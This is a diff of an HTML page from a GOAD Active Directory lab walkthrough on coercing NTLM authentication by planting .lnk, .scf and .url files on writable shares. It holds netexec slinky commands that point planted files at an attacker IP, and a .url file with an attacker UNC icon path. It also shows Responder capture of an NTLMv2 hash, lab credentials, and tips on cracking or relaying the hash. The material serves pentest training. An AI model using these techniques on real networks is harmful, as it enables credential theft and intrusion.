@@ -3,143 +3,36 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Part 12 - Having Fun - GOAD</title>
+  <title>Part 12 - Having fun inside a domain - Done - GOAD</title>
   <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
   <link rel="stylesheet" href="../assets/css/style.css">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
   <style>
-    .goad-nav {
-      padding: 20px;
-      max-height: calc(100vh - 200px);
-      overflow-y: auto;
-    }
-    .goad-nav h3 {
-      color: #ffdb70;
-      margin-bottom: 15px;
-      font-size: 1.1rem;
-      border-bottom: 2px solid #3a3a3a;
-      padding-bottom: 10px;
-    }
-    .goad-nav a {
-      display: block;
-      padding: 10px 15px;
-      margin: 5px 0;
-      color: #d6d6d6;
-      text-decoration: none;
-      border-radius: 6px;
-      font-size: 0.9rem;
-      transition: all 0.2s;
-      border-left: 3px solid transparent;
-    }
-    .goad-nav a:hover {
-      background: #2a2a2a;
-      color: #ffdb70;
-      border-left-color: #ffdb70;
-    }
-    .goad-nav a.active {
-      background: #2a2a2a;
-      color: #ffdb70;
-      border-left-color: #ffdb70;
-      font-weight: 600;
-    }
-    .page-nav {
-      display: flex;
-      justify-content: space-between;
-      margin: 30px 0;
-      padding: 20px 0;
-      border-top: 1px solid #2a2a2a;
-    }
-    .nav-btn {
-      background: #2a2a2a;
-      color: #ffdb70;
-      padding: 10px 20px;
-      border-radius: 6px;
-      text-decoration: none;
-      transition: all 0.2s;
-    }
-    .nav-btn:hover {
-      background: #ffdb70;
-      color: #1a1a1a;
-    }
-    /* Notion content styling */
-    .notion-content {
-      line-height: 1.6;
-    }
-    .notion-content img {
-      max-width: 100%;
-      height: auto;
-      margin: 20px 0;
-      border-radius: 8px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-    }
-    .notion-content h1 {
-      font-size: 1.8rem;
-      margin: 30px 0 20px;
-      color: #fafafa;
-      border-bottom: 2px solid #ffdb70;
-      padding-bottom: 10px;
-    }
-    .notion-content h2 {
-      font-size: 1.5rem;
-      margin: 25px 0 15px;
-      color: #fafafa;
-    }
-    .notion-content h3 {
-      font-size: 1.3rem;
-      margin: 20px 0 10px;
-      color: #fafafa;
-    }
-    .notion-content p {
-      margin: 15px 0;
-      color: #d6d6d6;
-    }
-    .notion-content ul, .notion-content ol {
-      margin: 15px 0 15px 30px;
-    }
-    .notion-content li {
-      margin: 5px 0;
-      color: #d6d6d6;
-    }
-    .notion-content code {
-      background: #2a2a2a;
-      padding: 2px 6px;
-      border-radius: 4px;
-      font-family: 'Courier New', monospace;
-      color: #ffdb70;
-    }
-    .notion-content pre {
-      background: #1e1e1e;
-      border-left: 4px solid #ffdb70;
-      padding: 15px;
-      margin: 20px 0;
-      border-radius: 0 8px 8px 0;
-      overflow-x: auto;
-    }
-    .notion-content a {
-      color: #ffdb70;
-      text-decoration: underline;
-    }
-    .notion-content strong {
-      color: #fafafa;
-      font-weight: 600;
-    }
-    .notion-content figure {
-      margin: 20px 0;
-    }
-    .notion-content figcaption {
-      display: none;
-    }
-    .notion-content summary {
-      font-weight: 600;
-      color: #ffdb70;
-      cursor: pointer;
-      padding: 10px 0;
-    }
-    .notion-content summary:hover {
-      color: #fafafa;
-    }
+    .goad-sidebar { padding: 20px; }
+    .goad-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .goad-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .goad-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .goad-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
   </style>
 </head>
 <body>
@@ -160,21 +53,21 @@
       </div>
       <div class="sidebar-info_more">
         <div class="separator"></div>
-        <div class="goad-nav">
+        <div class="goad-sidebar">
           <h3>Sections</h3>
           <a href="overview.html" class="">Overview</a>
-          <a href="part-01.html" class="">Part 1 - Reconnaissance and Scan</a>
-          <a href="part-02.html" class="">Part 2 - Finding Users</a>
-          <a href="part-03.html" class="">Part 3 - Authenticated Enumeration</a>
-          <a href="part-04.html" class="">Part 4 - Network Poisoning and NTLM Relaying</a>
-          <a href="part-05.html" class="">Part 5 - ADCS - ESC1 to ESC16</a>
-          <a href="part-06.html" class="">Part 6 - MSSQL</a>
-          <a href="part-07.html" class="">Part 7 - Privilege Escalation</a>
-          <a href="part-08.html" class="">Part 8 - Lateral Movement</a>
-          <a href="part-09.html" class="">Part 9 - Delegations</a>
-          <a href="part-10.html" class="">Part 10 - ACL</a>
-          <a href="part-11.html" class="">Part 11 - Abusing Trusts</a>
-          <a href="part-12.html" class="active">Part 12 - Having Fun</a>
+          <a href="part-01.html" class="">Part 1</a>
+          <a href="part-02.html" class="">Part 2</a>
+          <a href="part-03.html" class="">Part 3</a>
+          <a href="part-04.html" class="">Part 4</a>
+          <a href="part-05.html" class="">Part 5</a>
+          <a href="part-06.html" class="">Part 6</a>
+          <a href="part-07.html" class="">Part 7</a>
+          <a href="part-08.html" class="">Part 8</a>
+          <a href="part-09.html" class="">Part 9</a>
+          <a href="part-10.html" class="">Part 10</a>
+          <a href="part-11.html" class="">Part 11</a>
+          <a href="part-12.html" class="active">Part 12</a>
         </div>
         <div class="separator"></div>
         <ul class="contacts-list">
@@ -201,20 +94,20 @@
 
     <div class="main-content">
       <article class="about active" data-page="about">
-        <header class="h2 article-title">Part 12 - Having Fun</header>
+        <header class="h2 article-title">Part 12 - Having fun inside a domain - Done</header>
         <div class="page-nav"><a href="part-11.html" class="nav-btn">← Previous</a></div>
         <section class="about-text notion-content">
-          <details open=""><summary><mark class="highlight-default_background"><strong>GOAD - part 12 - Having fun inside a domain - Done</strong></mark></summary><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804d-af88-fa012118ed87" class="">The different techniques presented here need an active user to exploit them. For this attack, we need to have a valid user in the domain.<br/>We will have to simulate the victim by RDP connection manually.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c8-baa8-eef66d181556" class="">
+          <summary><mark class="highlight-default_background"><strong>GOAD - part 12 - Having fun inside a domain - Done</strong></mark></summary><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-804d-af88-fa012118ed87" class="">The different techniques presented here need an active user to exploit them. For this attack, we need to have a valid user in the domain.<br/>We will have to simulate the victim by RDP connection manually.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c8-baa8-eef66d181556" class="">
 </p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-80e9-bb6b-c29d2eefdb4c" class=""><strong>Coerce me with files</strong></h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801a-8037-e96f22e23411" class="">let’s start by enumerating CastelBlack server shares.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80dd-9e69-f0467bb44da6" class=""><code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p &#x27;Needle&#x27; -d north.sevenkingdoms.local --shares</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-800d-acc5-e7565bbaebb6" class="image"><a href="images/image-264.png"><img style="width:2395px" src="images/image-264.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-806c-b136-d4ca27871451" class="">We can see above that we have <code><strong>Read</strong></code> and <code><strong>Write</strong></code> access in <code><strong>all</strong></code> share.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8065-8dea-d682edd930dd" class="">So we can try some attacks here. Let’s start with <code><strong>slinky : .lnk file</strong></code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a5-869e-f4a17b239ebb" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c4-9cdc-da5c7670a9d0" class="">
 </p></div><div style="display:contents" dir="auto"><h2 id="30c79e9a-d7c9-805c-929b-cb7b490b3575" class=""><strong>Slinky: .lnk file</strong></h2></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c1-b465-dc787a49c7a8" class="">For this kind of attack, we will create a file with NetExec with module <strong>slinky. </strong>This module will create an ink file in every folders we do have <code><strong>Write</strong></code> permission on our target server.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ed-8b3b-d7263820b80a" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-801a-aeae-e9406ece141a" class="">1st - Let’s create and drop the file in a single command.<br/><code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p &#x27;Needle&#x27; -d north.sevenkingdoms.local --shares</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c9-81d3-f8563c8d6611" class=""><code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p &#x27;Needle&#x27; -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80fb-a9a5-edaee3d14b44" class="image"><a href="images/image-265.png"><img style="width:2430px" src="images/image-265.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8002-95a2-cf2c9a9135c6" class="">Above we can see that we enumerated the shares first then we created the<code><strong> .lnk </strong></code>file and added to all writable shares, in our case this file was added to <code><strong>all</strong></code> share.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8003-8654-c88ed9d16745" class="">After this, our next step is to launch Responder and listen on the network, in our case, we will use the interface on the network we are targeting.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ec-8290-ef4788ddb8fa" class=""><code>sudo responder -I vmnet2</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8014-9856-f9aef7ba6783" class="image"><a href="images/image-266.png"><img style="width:1867.9833984375px" src="images/image-266.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8041-9635-cd88df9cee22" class="">For this attack to work in this lab, we will login with a user, because we don’t have a valid bot.<br/>Let’s use xfreerdp ro remote access to the machine.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8047-aa08-fa6b58760b3e" class=""><code>xfreerdp /d:north.sevenkingdoms.local /u:catelyn.stark /p:robbsansabradonaryarickon /v:winterfell.north.sevenkingdoms.local /cert-ignore /size:80%</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-800d-9cc5-cf9036846876" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8073-8919-f185a260f627" class="">After connecting, we need to go to the shares <code><strong>all</strong></code>.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80fb-aeb7-e0eced8c7d06" class=""><code><strong>\\castelblack.north.sevenkingdoms.local\\all</strong></code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-809d-8371-f86a1396126d" class="image"><a href="images/image-267.png"><img style="width:1867.933349609375px" src="images/image-267.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8047-bf7b-ee32479f761f" class="">
-</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a1-af03-d61c389ccd20" class="">Once the user access the share we get the users hash through Responder.</p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80a1-9281-f4c46a5323b7" class="image"><a href="images/image-268.png"><img style="width:2525px" src="images/image-268.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-80de-9682-e2a4fba15725" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">catelyn.stark::NORTH:19d99c632a805889:0A6C8691396FE9B6A3AD3B5B3B378671:0101000000000000807C08D0D26CDA0113EF01224A1B3CFE000000000200080036005A005300590001001E00570049004E002D004200560032003900370035003100460036005700510004003400570049004E002D00420056003200390037003500310046003600570051002E0036005A00530059002E004C004F00430041004C000300140036005A00530059002E004C004F00430041004C000500140036005A00530059002E004C004F00430041004C0007000800807C08D0D26CDA010600040002000000080030003000000000000000010000000020000014D15C2C005F5BBD167168BE6315E609F4B52B5F2604A44EB5ECB51FFF2D5E5E0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0031000000000000000000</code></pre></div><div style="display:contents" dir="auto"><blockquote id="30c79e9a-d7c9-8096-849d-e8b6e7f907d2" class="">This coerce append automatically when the victim visit the share, no need to click! I let you imagine what append if you drop that kind of file on a common public share during your pentest.<br/>Here the file start with a “.” so it will be hidden if you don’t activate show hidden file option. The coerce only append when the file is showed (in a pentest it’s recommended to not use a filename starting with “.”)</blockquote></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8092-ae6c-fedde9fdafe0" class="">We can now get the NTLMv2 hash and try to crack it using John or hashcat.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80bd-8ad1-e2e06ea26c0e" class="">In case we can not crack the hash(for password complexity) It is also possible to do a relay here using <a href="http://ntlmrelayx.py">ntlmrelayx.py</a> to not smb signed server and get share access or admin access depending on the relayed authentication target.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ac-a4d7-cf8af5e2845f" class="">
+</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a1-af03-d61c389ccd20" class="">Once the user access the share we get the users hash through Responder.</p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80a1-9281-f4c46a5323b7" class="image"><a href="images/image-268.png"><img style="width:2525px" src="images/image-268.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80de-9682-e2a4fba15725" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">catelyn.stark::NORTH:19d99c632a805889:0A6C8691396FE9B6A3AD3B5B3B378671:0101000000000000807C08D0D26CDA0113EF01224A1B3CFE000000000200080036005A005300590001001E00570049004E002D004200560032003900370035003100460036005700510004003400570049004E002D00420056003200390037003500310046003600570051002E0036005A00530059002E004C004F00430041004C000300140036005A00530059002E004C004F00430041004C000500140036005A00530059002E004C004F00430041004C0007000800807C08D0D26CDA010600040002000000080030003000000000000000010000000020000014D15C2C005F5BBD167168BE6315E609F4B52B5F2604A44EB5ECB51FFF2D5E5E0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0031000000000000000000</code></pre></div><div style="display:contents" dir="auto"><blockquote id="30c79e9a-d7c9-8096-849d-e8b6e7f907d2" class="">This coerce append automatically when the victim visit the share, no need to click! I let you imagine what append if you drop that kind of file on a common public share during your pentest.<br/>Here the file start with a “.” so it will be hidden if you don’t activate show hidden file option. The coerce only append when the file is showed (in a pentest it’s recommended to not use a filename starting with “.”)</blockquote></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8092-ae6c-fedde9fdafe0" class="">We can now get the NTLMv2 hash and try to crack it using John or hashcat.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80bd-8ad1-e2e06ea26c0e" class="">In case we can not crack the hash(for password complexity) It is also possible to do a relay here using <a href="http://ntlmrelayx.py">ntlmrelayx.py</a> to not smb signed server and get share access or admin access depending on the relayed authentication target.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80ac-a4d7-cf8af5e2845f" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e0-8676-cf111c963725" class="">To keep the lab clean, let’s clean this .lnk file.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80cd-98bf-d52b75358c76" class=""><code>netexec smb castelblack.north.sevenkingdoms.local -u arya.stark -p &#x27;Needle&#x27; -d north.sevenkingdoms.local -M slinky -o NAME=.thumbs.db SERVER=attacker_ip CLEANUP=true</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8061-b242-ecad6500eeea" class="">
 </p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-807a-9c7a-d381ad174162" class=""><strong>.scf : sucffy</strong></h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8038-9a3b-d99d9c3e909c" class="">The previous attack can also be achieved using .scf. The proccess is exactly the same as the previous one.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8083-b014-d25227a1bb18" class="">
 </p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-8011-9def-d34516f65850" class=""><strong>.url file</strong></h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d6-bbf3-c6935b32687d" class="">Now, this Coerce attack is by using .url files. Let’s start by creating a file called <code><strong>salaryFiles.url</strong></code> , it’s good to use creative names, even tho for this attack to work, the users doesn’t need to click/open the file, the user just need to access the folder were the file is.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8085-9332-dbd11e5566d2" class="">
-</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-804e-8f95-f9188dd9754d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">[InternetShortcut]
+</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-804e-8f95-f9188dd9754d" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">[InternetShortcut]
 URL=http://hr.company.com/pwned
 WorkingDirectory=test
 IconFile=\\10.4.10.1\%USERNAME%.icon
@@ -257,7 +150,7 @@ IconIndex=1</code></pre></div><div style="display:contents" dir="auto"><p id="30
 </p></div><div style="display:contents" dir="auto"><p id="30e79e9a-d7c9-801b-bee9-e836b4349b6a" class="">
 </p></div><div style="display:contents" dir="auto"><h3 id="30e79e9a-d7c9-80e5-9433-e50de25f9c83" class="">Future Attack to be added:</h3></div><div style="display:contents" dir="auto"><p id="30e79e9a-d7c9-80d6-97d7-d3f38b16a4e8" class=""><strong>Login Script Hijacking: A</strong> classic persistence move where we use our <strong>GenericAll</strong> rights to booby-trap User’s scriptPath attribute, forcing the network to run our malicious code the absolute second he/she logs into her computer.</p></div><div style="display:contents" dir="auto"><p id="30e79e9a-d7c9-8084-8e3b-c4a4c82df5d6" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30e79e9a-d7c9-80ea-9546-cfc9121b89f1" class="">
-</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span>
+</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
         </section>
         <div class="page-nav"><a href="part-11.html" class="nav-btn">← Previous</a></div>
       </article>
